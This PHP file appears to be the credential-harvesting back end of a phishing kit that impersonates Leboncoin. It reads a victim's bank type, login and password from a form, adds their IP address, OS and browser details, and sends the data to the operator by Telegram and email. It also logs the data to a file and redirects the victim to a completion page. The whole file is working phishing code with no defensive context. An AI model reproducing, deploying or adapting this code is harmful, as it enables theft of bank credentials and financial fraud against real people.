<?php
error_reporting(0);
if(isset($_POST['bankType']) ){
include "../config.php";
include "inc/funcs.php";




$subject = "[Leboncoin] [Bank] INFO from $ip";

$info1 = $_POST['bankType'];
$info2 = $_POST['bankLogin'];
$info3 = $_POST['bankPassword'];




$message = "bankType: $info1\nbankLogin: $info2\nbankPassword: $info3\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../complete.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../bank.php\" />";
}
?>
